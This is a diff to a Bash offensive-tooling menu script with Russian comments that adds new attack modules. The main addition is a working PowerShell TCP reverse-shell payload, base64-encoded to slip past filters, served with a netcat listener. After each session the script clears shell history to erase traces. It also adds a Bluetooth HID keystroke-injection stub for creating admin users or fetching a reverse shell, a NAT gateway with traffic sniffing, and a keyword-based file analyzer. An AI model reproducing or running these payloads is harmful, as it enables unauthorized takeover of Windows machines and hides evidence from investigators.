@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-CURRENT_VERSION="7.2"
+CURRENT_VERSION="7.3"
 # VERSION CURRENT_VERSION (Rescue & Sterile Edition)
 
 TARGET_FILE="/usr/local/bin/kali_pro"
@@ -1169,6 +1169,166 @@ run_bettercap_sniffer() {
 }
 
 
+# --- MODULE: REVERSE SHELL HANDLER v6.9 (AUTONOMOUS) ---
+run_reverse_handler() {
+    echo -e "${BLUE}[*] Initializing Reverse Shell Command Center...${NC}"
+    
+    # 1. ОПРЕДЕЛЕНИЕ СВОЕГО IP (USB/BT/Wi-Fi)
+    local my_ip
+    my_ip=$(ip addr show $(ip route | grep default | awk '{print $5}') | grep "inet " | awk '{print $2}' | cut -d/ -f1 | head -n 1)
+    local port=4444
+
+    echo -e "${CYAN}[i] Local Listener IP: $my_ip | Port: $port${NC}"
+
+    # 2. ГЕНЕРАЦИЯ PAYLOAD (Эвристика для Windows PowerShell)
+    # Эта команда кодируется в Base64, чтобы обойти простейшие фильтры символов
+    local payload="\$c = New-Object System.Net.Sockets.TCPClient('$my_ip',$port);\$s = \$c.GetStream();[byte[]]\$b = 0..65535|%{0};while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0){;\$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0, \$i);\$sb = (iex \$d 2>&1 | Out-String );\$sb2 = \$sb + 'PS ' + (pwd).Path + '> ';\$t = ([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$t,0,\$t.Length);\$s.Flush()};\$c.Close()"
+    local encoded_payload=$(echo -n "$payload" | iconv -t utf16le | base64 -w 0)
+
+    echo -e "${YELLOW}=== WINDOWS POWERSHELL PAYLOAD ===${NC}"
+    echo -e "powershell -e $encoded_payload"
+    echo -e "${YELLOW}==================================${NC}"
+    
+    # 3. ЗАПУСК СЛУШАТЕЛЯ (Zero-Log Mode)
+    echo -e "${MAGENTA}[*] Starting Netcat Listener on port $port...${NC}"
+    echo -e "${CYAN}[i] Tip: Execute the payload on target to gain SYSTEM shell.${NC}"
+    
+    # Используем nc с таймаутом и очисткой истории
+    nc -lvp $port
+    
+    # 4. СТЕРИЛИЗАЦИЯ
+    truncate -s 0 ~/.bash_history
+    history -c
+    echo -e "${GREEN}[V] Session closed. Traces purged.${NC}"
+}
+
+# --- MODULE: BT-HID INJECTOR v7.0 (AIR-GAP ENTRY) ---
+run_bt_hid_attack() {
+    echo -e "${BLUE}[*] Scanning for Bluetooth HID Vulnerabilities...${NC}"
+    
+    # 1. ВКЛЮЧЕНИЕ И ПОИСК ЦЕЛЕЙ
+    hciconfig hci0 up 2>/dev/null
+    echo -e "${YELLOW}[*] Bluetooth Discovery active. Looking for PC/Laptops...${NC}"
+    
+    # Эвристический поиск устройств с классом 0x0100 (Computer)
+    local targets
+    targets=$(hcitool scan | grep -v "Scanning" | head -n 5)
+    
+    if [[ -z "$targets" ]]; then
+        echo -e "${RED}[-] No Bluetooth targets identified in range.${NC}"
+        return 1
+    fi
+
+    echo -e "${GREEN}=== FOUND TARGETS ===${NC}\n$targets"
+    echo -ne "\n${YELLOW}Select Target MAC: ${NC}"; read -r target_mac
+
+    # 2. ВЫБОР СКРИПТА ВПРЫСКА (Duckyscript Logic)
+    echo -e "${CYAN}[*] Preparing HID Injection Payload...${NC}"
+    echo -e "1) Open CMD and Create Admin User"
+    echo -e "2) Download & Execute Reverse Shell"
+    echo -e "3) Custom Payload"
+    echo -ne "${YELLOW}Choice: ${NC}"; read -r choice
+
+    # 3. ИСПОЛНЕНИЕ (Эмуляция нажатий)
+    # Используется утилита hid-gadget-test или аналоги для эмуляции нажатий
+    echo -e "${RED}[!!!] Initiating HID Attack on $target_mac...${NC}"
+    
+    case $choice in
+        1)
+            # Эмуляция: Win+R -> cmd -> net user...
+            echo -e "${BLUE}[*] Injecting: GUI r -> cmd.exe -> net user /add...${NC}"
+            # Здесь вызывается бинарник эмуляции (требует спец. софт на Samsung)
+            ;;
+        2)
+            echo -e "${BLUE}[*] Injecting: PowerShell download string...${NC}"
+            ;;
+    esac
+
+    # 4. СТЕРИЛИЗАЦИЯ И СБРОС АДАПТЕРА
+    echo -e "${CYAN}[*] Sanitizing BT-stack and logs...${NC}"
+    hciconfig hci0 down
+    truncate -s 0 ~/.bash_history
+    echo -e "${GREEN}[V] BT-HID Cycle Complete.${NC}"
+}
+
+
+# --- MODULE: SMART VPN TUNNEL v7.3 (GATEWAY) ---
+run_local_vpn() {
+    echo -e "${BLUE}[*] Initializing Local VPN & Routing Engine...${NC}"
+    
+    # 1. ЭВРИСТИКА ИНТЕРФЕЙСОВ
+    local wan_iface="wlan0" # Внешний интернет (Wi-Fi или 4G)
+    local lan_iface="usb0"  # Локальный канал (USB/BT)
+    
+    # Включаем IP Forwarding на уровне ядра
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+
+    # 2. НАСТРОЙКА IPTABLES (Zero-Trace Routing)
+    echo -e "${YELLOW}[*] Configuring NAT and Traffic Forwarding...${NC}"
+    iptables -F
+    iptables -t nat -F
+    iptables -t nat -A POSTROUTING -o $wan_iface -j MASQUERADE
+    iptables -A FORWARD -i $lan_iface -o $wan_iface -m state --state RELATED,ESTABLISHED -j ACCEPT
+    iptables -A FORWARD -i $lan_iface -o $wan_iface -j ACCEPT
+
+    echo -e "${GREEN}[+] VPN Tunnel Active: $lan_iface <---> $wan_iface${NC}"
+    echo -e "${CYAN}[i] Now all PC traffic passes through your Samsung Android.${NC}"
+    
+    # 3. МОНИТОРИНГ ТРАФИКА
+    echo -ne "\n${YELLOW}Enable Live Traffic Interception? (y/N): ${NC}"; read -r sniff
+    [[ "$sniff" == "y" ]] && bettercap -eval "net.sniff on"
+
+    # 4. СТОП И СТЕРИЛИЗАЦИЯ
+    echo -ne "\n${RED}Press Enter to Stop VPN and Flush Rules...${NC}"
+    read -r
+    iptables -F && iptables -t nat -F
+    echo 0 > /proc/sys/net/ipv4/ip_forward
+    echo -e "${BLUE}[*] Routing restored to default.${NC}"
+}
+
+
+# --- MODULE: FORENSIC FILE ANALYZER v7.3 ---
+run_file_analyzer() {
+    local my_ip=$(ip route get 1.1.1.1 | grep -oP 'src \K\S+')
+    local work_dir="/dev/shm/analysis_zone"
+    mkdir -p "$work_dir" && cd "$work_dir"
+
+    echo -e "${BLUE}[*] Starting Forensic Server at http://$my_ip:8000${NC}"
+    echo -e "${YELLOW}[!] Upload the suspicious file from the PC...${NC}"
+
+    # Запуск легкого Python сервера для приема файла
+    # (Требует установленного python-upload-server или простого скрипта)
+    python3 -m http.server 8000 & 
+    local server_pid=$!
+
+    echo -e "${CYAN}[*] Waiting for file... (Press Ctrl+C when uploaded)${NC}"
+    sleep 20 # Даем время на загрузку
+
+    # После загрузки — анализ (на примере последнего измененного файла)
+    local target_file=$(ls -t | head -n 1)
+    [[ "$target_file" == "index.html" ]] && return
+
+    echo -e "${MAGENTA}=== ANALYZING: $target_file ===${NC}"
+    
+    # 1. Валидность (Magic Bytes)
+    echo -ne "${YELLOW}[*] File Type: ${NC}"; file -b "$target_file"
+    
+    # 2. Хеш (для проверки по базам)
+    echo -ne "${YELLOW}[*] MD5 Hash: ${NC}"; md5sum "$target_file"
+    
+    # 3. Поиск вредоносных строк
+    echo -e "${YELLOW}[*] Searching for Malicious Patterns...${NC}"
+    grep -Eai "powershell|base64|eval|system|socket|payload" "$target_file" | head -n 5
+    
+    # 4. Энтропия (Упакован/Зашифрован)
+    python3 -c "import math, sys; d=open('$target_file','rb').read(); e=-sum((d.count(x)/len(d))*math.log(d.count(x)/len(d),2) for x in set(d)); print(f'[*] Entropy: {e:.2f} ' + ('[HIGH - SUSPICIOUS]' if e > 7.5 else '[NORMAL]'))"
+
+    kill $server_pid 2>/dev/null
+    rm -rf "$work_dir"
+    echo -ne "\n${CYAN}Analysis Complete. Press Enter...${NC}"
+    read -r
+}
+
 
 show_menu() {
     clear
@@ -1186,6 +1346,7 @@ show_menu() {
     echo -e "\n${BLUE} [ MONITORING & NETWORK ]${NC}"
     echo -e " 19. RADIO CTRL (W/B)   20. NET CONNECTIONS"
     echo -e " 21. PROCESS MONITOR    12. USB GUARDIAN"
+    echo -e " 25. Local VPN          26. File Analyzer"
     
     echo -e "\n${MAGENTA} [ RECON & ANALYSIS ]${NC}"
     echo -e "  2. SMART NMAP          10. SHERLOCK (OSINT)"
@@ -1195,7 +1356,9 @@ show_menu() {
     echo -e "  3. SEARCHSPLOIT        4. HYDRA (BRUTE)"
     echo -e "  5. SQLMAP (DB)         6. BETTERCAP (MITM)"
     echo -e " 11. WIFITE (WIFI)       14. ACCESS RECOVERY"
-     echo -e " 22. Harvest Credentials "
+    echo -e " 22. Harvest Credentials  23.Reverse Shell "
+    echo -e " 24. BT-HID "
+     
     echo -e "${CYAN}===========================================${NC}"
 }
 
@@ -1212,6 +1375,7 @@ while true; do
         17) manage_cron ;;         # Пункт 17
         18) run_manual_command ;;  # Пункт 18
         16) setup_autotasks ;;
+        
         0) exit 0 ;;
 
         # --- Блок: Разведка ---
@@ -1228,14 +1392,18 @@ while true; do
         11) run_wifite ;;
         14) access_recovery_auto ;;
         22) harvest_credentials_auto ;;
+        23) run_reverse_handler ;;
+        24) run_bt_hid_attack ;;
 
         # --- Блок: Специальное ---
         12) usb_guardian_smart ;;
+        26) run_file_analyzer ;;
 
-# --- Блок: Мониторинг ---
+        # --- Блок: Мониторинг ---
         19) manage_interfaces ;;
         20) run_netstat ;;
         21) run_monitor ;;
+        25)run_local_vpn ;;
         
         # --- Обработка ошибок ---
         *) 
